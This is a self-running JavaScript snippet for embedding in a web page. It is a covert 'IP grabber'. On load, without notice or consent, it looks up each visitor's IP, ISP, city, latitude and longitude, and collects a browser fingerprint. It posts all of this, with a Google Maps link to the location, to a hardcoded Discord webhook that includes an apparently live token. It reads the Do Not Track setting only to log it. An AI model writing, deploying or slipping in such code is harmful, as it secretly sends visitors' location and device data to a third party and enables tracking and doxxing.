(() => {
  const WEBHOOK = "https://discord.com/api/webhooks/1449581295586902086/ANG9p_pgkcRfYL729QPbKBh6FyDUEuBmOoOCznvscoa6uS7d-OMmTicwxo5D_tRk-Ep0";
  const BLOCKED = ["","",""];
  const COOLDOWN = 15000;

  const blocked = ip => !ip || BLOCKED.includes(ip.split(".")[0]);

  const add = (f,n,v,i=true) => {
    if (v != null) { const s = String(v).trim(); if (s) f.push({name:n,value:s,inline:i}); }
  };

  const fp = () => ({
    ua: navigator.userAgent,
    plat: navigator.platform,
    lang: navigator.language || navigator.userLanguage || "N/A",
    res: `${screen.width}x${screen.height}`,
    tz: new Date().getTimezoneOffset(),
    cookies: navigator.cookieEnabled,
    dnt: navigator.doNotTrack || "N/A",
    mem: navigator.deviceMemory || "N/A"
  });

  const ts = () => new Date().toLocaleString(undefined, {dateStyle:"medium",timeStyle:"short",hour12:false});

  const canLog = () => {
    try {
      const last = localStorage.getItem("vlog");
      return !last || Date.now() - +last >= COOLDOWN;
    } catch { return true; }
  };

  const setLog = () => { try { localStorage.setItem("vlog", Date.now()); } catch {} };

  const log = async () => {
    if (!canLog()) return;
    try {
      const r = await fetch("https://ipwho.is/");
      const d = await r.json();
      if (!d.success || blocked(d.ip)) return;

      const f = fp();
      const fields = [];
      ["ip","hostname","city","region","country","country_code","continent","continent_code","latitude","longitude","postal"].forEach(k => add(fields, k.replace("_"," ").replace(/\b\w/g,c=>c.toUpperCase()), d[k]));
      add(fields,"Timezone", d.timezone?.id);
      add(fields,"Local Time", d.timezone?.current_time);
      add(fields,"Organization", d.org);
      add(fields,"ISP", d.isp);
      add(fields,"ASN", d.asn);
      add(fields,"User Agent", f.ua);
      add(fields,"Platform", f.plat);
      add(fields,"Language", f.lang);
      add(fields,"Screen Resolution", f.res);
      add(fields,"Timezone Offset (min)", f.tz);
      add(fields,"Cookies Enabled", f.cookies);
      add(fields,"Do Not Track", f.dnt);
      add(fields,"Device Memory (GB)", f.mem);
      add(fields,"Referrer", document.referrer || "N/A");
      if (d.latitude && d.longitude) add(fields,"Location Map", `[View on Google Maps](https://www.google.com/maps?q=${d.latitude},${d.longitude})`, false);

      await fetch(WEBHOOK, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({embeds:[{
          title: "New Logged",
          color: 0xd14527,
          thumbnail: {url: "https://files.catbox.moe/b7ql3x.gif"},
          fields,
          footer: {text: `Visitor log • ${ts()}`},
          timestamp: new Date().toISOString()
        }]})
      });
      setLog();
    } catch(e) { console.error(e); }
  };

  if (document.readyState === "loading") window.addEventListener("load", log);
  else log();
})();
